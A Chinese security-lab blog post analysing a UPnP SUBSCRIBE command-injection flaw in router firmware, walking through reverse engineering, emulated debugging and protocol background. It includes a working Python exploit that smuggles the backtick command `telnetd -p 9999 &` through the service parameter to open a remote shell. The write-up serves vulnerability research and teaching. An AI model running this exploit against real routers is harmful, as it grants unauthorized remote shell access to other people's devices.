---
title: 小心你的路由器 —— UPnP 协议分析
url: https://mp.weixin.qq.com/s/VnVo_UYFbiPuaS_bH49g5w
source: Doonsec's feed
date: 2026-01-09
fetch_date: 2026-01-10T03:22:52.389137
---

# 小心你的路由器 —— UPnP 协议分析

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/PicDhHpwdziaib4zTIfze5aUeMXapjKfmNIczxPWN0X7iadJwHQ1wQQXYPaBoo4Rb442KOEqxicedf1QPWtOKTdkWuw/0?wx_fmt=jpeg)

# 小心你的路由器 —— UPnP 协议分析

原创

zx

联想全球安全实验室

![]()

在小说阅读器中沉浸阅读

**点击蓝字 关注我们**

![](https://mmbiz.qpic.cn/mmbiz_png/INRb4MCKe9bhnicMvBELYsSpnCErDzKAEMfaFkUPEN5zdqq6T1H2VuZl7uUT2XeTCpxVNFx82btNIubBLNtI6Ig/640?wx_fmt=png)

**小心你的路由器  UPnP 协议分析**

**一**

**漏洞分析**

![](https://mmbiz.qpic.cn/mmbiz_gif/BBRxEeqtefiasDDcyfCQljnDRl7m4lTHtCtYNRibqYCjL7iaicc5wNoUCFxBumIrwulmjAOsyJpGkYxeLXaI07D4RA/640?wx_fmt=gif)

拿到路由器后，第一步当然是从最基本的暴漏面入手。这里直接通过nmap扫描发现路由器默认开启了49152端口，通过搜索可知某些路由器有可能把49152当作 UPnP 协议的端口。找到http服务的主程序cgibin，就在根目录下。IDA打开，在字符串表中搜索upnp，定位到0x4242D0这个位置，如下图所示：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PicDhHpwdziaib4zTIfze5aUeMXapjKfmNIuwQhldKZTgMdyoz2vJJ0icyGn2L3F4ItHQicZmLCbuNG70ClXia9XLwRg/640?wx_fmt=png)

查看引用，发现sub\_40FCE0这个函数，F5看其伪代码。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PicDhHpwdziaib4zTIfze5aUeMXapjKfmNIpoZGJ69upBribZpbVQ6ckmcGibxLbj9LBdgoibPc59EY532WyoORa7TdQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PicDhHpwdziaib4zTIfze5aUeMXapjKfmNISZXT8laDnpMLNmIXicn0GUGOalTDTjCsicO3fSBcOgZjaoZ7cjgOzicibw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PicDhHpwdziaib4zTIfze5aUeMXapjKfmNI5f4L87IUibmTMnw7euTuKvuWpUeic63YQDIy0VyJtjLNatOqEK3iakWicw/640?wx_fmt=png)

再查看引用，发现了genacgi\_main()这个函数，分析它的代码逻辑，发现if分支，v0与“SUBSCRIBE”相匹配时调用40FCE0这个函数，v0又来自于getenv(“REQUEST\_METHOD”)，这时可以知道请求方法为SUBSCRIBE时会来到该函数的位置，SUBSCRIBE正是 UPnP 协议数据包的一种请求方式。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PicDhHpwdziaib4zTIfze5aUeMXapjKfmNIhZnxXpQtLD8BULgm5K4agB6RE50cJicMTic8jyq0Pt3fFh8Ax7rEddKQ/640?wx_fmt=png)

分析40FCE0这个函数，发现snprintf这个函数操作了一些字符串和变量，如下：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PicDhHpwdziaib4zTIfze5aUeMXapjKfmNIUu2ickfEtuHal4jEfeCDHg96ycqibFKJKlg6l5o68Ars6Gedx9k7Hobw/640?wx_fmt=png)

我们把它整理还原一下，大概内容如下：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PicDhHpwdziaib4zTIfze5aUeMXapjKfmNIruUKR50mcT9VQlAlic6BkaFV0fpkA7I7M5wOWYoNgq9XVh0yqENM1CA/640?wx_fmt=png)

可以看到写入的数据是通过run.NOTIFY.php文件执行的操作。run.NOTIFY.php部分代码如下：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PicDhHpwdziaib4zTIfze5aUeMXapjKfmNIicQKVBSmTsJ4AgeNJjN0k6mGLnZCNwEPAJJKH2ibltZz4Qccqn7qxOfw/640?wx_fmt=png)

根据环境的设置，该脚本会调用PHP 函数 GENA\_subscribe\_new()，并传递cgibin程序中genacgi\_main()函数获得的变量，还包括变量SHELL\_FILE。根据搜索，可知 GENA\_subscribe\_new()定义在 gena.php文件中：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PicDhHpwdziaib4zTIfze5aUeMXapjKfmNILMSDGtg2qMMuuBs1o9CUcZzzq7KsSs0iam95hRFSKdu1GC7uuaCnyAw/640?wx_fmt=png)

从GENA\_subscribe\_new功能上分析可知函数并不修改 $shell\_file 变量。GENA\_subscribe\_new传递$shell\_file 到 GENA\_notify\_init函数，也是shell\_file最终处理的地方：通过调用 PHP 函数fwrite()创建新文件。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PicDhHpwdziaib4zTIfze5aUeMXapjKfmNIcxjSxEh9picUB0u4iadEDe32GQo2yC5o4lMKs74FEnTjAhDd0mGZI4ew/640?wx_fmt=png)

fwrite()函数被调用了两次：第一次创建文件，也就是上图的第一个红框，文件名由可控的shell\_file变量的v0,v16组成：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PicDhHpwdziaib4zTIfze5aUeMXapjKfmNIL1Avha3eicecJ2AKUk4BAE8ZHY0K2l3GRv2VM7PRWVziaeys1eX9epqw/640?wx_fmt=png)

这里看好，关键点在于用户可控的v0，从上图的这个位置往上翻，把v0是什么给找出来，以我在分析时的情况为例，84行v0=v28，那就继续往上翻，找v28。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PicDhHpwdziaib4zTIfze5aUeMXapjKfmNIDMHeovAu3ogkbIo2wveq7ibWgBzGypIWYN1lOJlmgb464sWicvCO1jHg/640?wx_fmt=png)

来到52行，v28=v27+9，继续往上翻找v27。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PicDhHpwdziaib4zTIfze5aUeMXapjKfmNI62XxYHYW94gZb9tJHILA7QJuia6zBGcNxckYWzlEICGK78R8Q9avy0Q/640?wx_fmt=png)

逐步往上看，注意47-49三行，47行调用getenv()函数获取"REQUEST\_URI"（https://a.com/?pageId=1,这种数据就是REQUEST\_URI的内容），并将结果保存在v25，48行在v25中匹配字符‘?’（‘?’的ASCII码是63，可自行去查，或者在IDA中按'E'键可快速ASCII转字符）并将其索引返回给v26，而v27=v26。根据50-52行逻辑可知v28来到了“?service=”之后，也就是说这里接收了一个http请求，参数名为service，参数值为v28开始的位置（因为"?service="的长度就是9，而v28=v27+9）。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PicDhHpwdziaib4zTIfze5aUeMXapjKfmNItMoCsIqmSWBk7zrZicBibshvRMbAyiblwspJN7FH7eyGpKeqHE4AMqTfg/640?wx_fmt=png)

上面已经说清楚可控变量v0的逻辑，这时候再回到php的脚本里，也就是上面那张黑色背景的代码截图。可以看到第二次调用fwrite()函数（也就是第二个红框处）时向文件中添加删除命令 "rm -f ".$shell\_file."\n"，（漏洞点触发原因）：进行攻击时，只需要插入一个反引号包裹的系统命令，将其注入到shell 脚本中。在脚本执行 rm 命令时因遇到反引号而失败，继续执行引号里面的系统命令，从而触发远程命令执行漏洞。所以，只要控制好 "/gena.cgi?service=shell\_file"中 shell\_file的内容为反引号包裹的系统命令，就可以触发漏洞。

这时，需要用到http和upnp服务，由于用qemu不太清楚怎么顺利开启路由器的http和upnp服务，所以此处又使用FirmAE对固件进行了仿真，exp的执行也是依靠FirmAE的仿真进行的，最终EXP如下：

```
exp.py # exp的逻辑旨在构造一个合法的upnp请求包，然后将这个包发给路由器，让路由器把telnet打开，之后就可以直接telnet过去，获取shell。!/usr/bin/python3 import socketimport osfrom time import sleep def httpSUB(server, port, shell_file):    print('\n[*] Connection {host}:{port}'.format(host=server, port=port))     con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    request  = "SUBSCRIBE /gena.cgi?service=" + str(shell_file) + " HTTP/1.1\n"    request += "Host: " + str(server) + str(port) + "\n"    request += "Callback: <http://192.168.0.4:1111/ServiceProxy27>\n"    request += "NT: upnp:event\n"    request += "Timeout: Second-1800\n"    request += "Accept-Encoding: gzip, deflate\n"    request += "User-Agent: gupnp-universal-cp GUPnP/1.0.2 DLNADOC/1.50\n\n"    print('[*] Sending Payload')    sleep(1)     con.connect((socket.gethostbyname(server), port))    con.send(request.encode())        print('[*] Running Telnetd Service')    sleep(2)     print('[*] Opening Telnet Connection\n')    #os.system('telnet ' + str(server) + ' 9999') serverInput = "192.168.0.1"portInput = 49152httpSUB(serverInput, portInput, '`telnetd -p 9999 &`')
```

这时就可以另开一个shell，telnet过去了。

**二**

**动态调试**

![](https://mmbiz.qpic.cn/mmbiz_gif/BBRxEeqtefiasDDcyfCQljnDRl7m4lTHtCtYNRibqYCjL7iaicc5wNoUCFxBumIrwulmjAOsyJpGkYxeLXaI07D4RA/640?wx_fmt=gif)

在虚拟机中将固件解包，并把qemu-mips-static放置在固件解包后的根目录下，然后执行命令进行动态调试。

根据main函数的参数字符串比较，想要跳转到漏洞函数，需要设置几个环境变量，其内容需要通过snprintf() 函数的之前的检查，并访问htdocs/gena.cgi：

```
-->sudo chroot ./ ./qemu-mips-static \-E REQUEST_METHOD="SUBSCRIBE" \-E REQUEST_URI="SUBSCRIBE /gena.cgi?service=L3Forwarding1" \-E SERVER_ID="server_id" \-E HTTP_NT="upnp:event" \-E HTTP_CALLBACK="<http://192.168.126.139:34033/ServiceProxy27>/" \-E HTTP_TIMEOUT="Second-1800" \-E REMOTE_ADDR="192.168.0.1" \-E HTTP_COOKIE="aaaaaaaa" \-E CONTENT_TYPE="application/x-www-form-urlencoded" \-g 1234 -0 htdocs/gena.cgi /htdocs/cgibin
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PicDhHpwdziaib4zTIfze5aUeMXapjKfmNIYAXQsiayLa7S8d54xtxbYvkDyKGCqR3dskl0w73teLPgZPeypRmh4Cw/640?wx_fmt=png)

用IDA对cgibin文件逆向，找到snprintf()函数，下断点：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PicDhHpwdziaib4zTIfze5aUeMXapjKfmNIH1BCZDYIg4jKbFWXBibvAJ46cpemY7nkDoYwhzr0I9IsbIc7IVuIF8A/640?wx_fmt=png)

之后用IDA连接gdbserver，设置步骤如下，找到上方菜单栏中中的Debugger并点击，再点击Select debugger...：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PicDhHpwdziaib4zTIfze5aUeMXapjKfmNI3hgxJtnse4j7U7E3J606ZmXeWDicPiaElz3gRIaN92v9OuNYkicutTJXQ/640?wx_fmt=png)

经过上述操作后再点击Debugger，会出现以下内容，点击Process options...进行设置：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PicDhHpwdziaib4zTIfze5aUeMXapjKfmNI68hzne4jeJ1dOyruNNQ1kqSCpyhfSQvtyVAsjICibdWouWkYP4mbcOQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PicDhHpwdziaib4zTIfze5aUeMXapjKfmNIXt07LHFq0E8KlPKjDyvWvoxicC1AHU3PN9b58XG5ibOjetI8bwsDzuLg/640?wx_fmt=png)

其中Hostname为虚拟机IP，在虚拟机中通过ifconfig查看即可，Port为上面执行chroot命令时设置的端口号，可自定义，不要与在使用的端口重复就好。之后点击Start process，连接成功，来到如下页面：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PicDhHpwdziaib4zTIfze5aUeMXapjKfmNIicUCtDdlIQLVoqNcqkOiaxaSiaE6kp3oo19PMK6wVHCcsBKpbrW67jKEg/640?wx_fmt=png)

F9执行到断点处，这是查看缓冲区中的数据，可以发现调用的文件是run.NOTIFY.php，上文设置的环境变量已经被写入到对应的位置：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PicDhHpwdziaib4zTIfze5aUeMXapjKfmNIibfDXTicVYk5r10df45jsVibtZwZx9d1wNQnG6K92mpicganlyEXKpJ9fA/640?wx_fmt=png)

之后便可开始对run.NOTIFY.php文件进行分析，进而找出漏洞触发位置以及利用逻辑。

**三**

**背景知识**

![](https://mmbiz.qpic.cn/mmbiz_gif/BBRxEeqtefiasDDcyfCQljnDRl7m4lTHtCtYNRibqYCjL7iaicc5wNoUCFxBumIrwulmjAOsyJpGkYxeLXaI07D4RA/640?wx_fmt=gif)

**UPnP 协议**

**UPnP（Universal Plug and Play）**，即通用即插即用协议，是一种网络协议集合，旨在让电脑、智能电器等设备在网络中自动发现、连接和通信。下面我将以更通俗的语言来解释 UPnP 协议：

**基本概念：**UPnP 协议就像是网络世界中的一个“自动介绍和交友”系统。当一个新的设备（比如你的智能手机或打印机）加入网络时，UPnP会自动向网络中的其他设备“打招呼”，告诉它们：“嗨，我是新来的，我能提供这些服务。”同时，它也会去“询问”...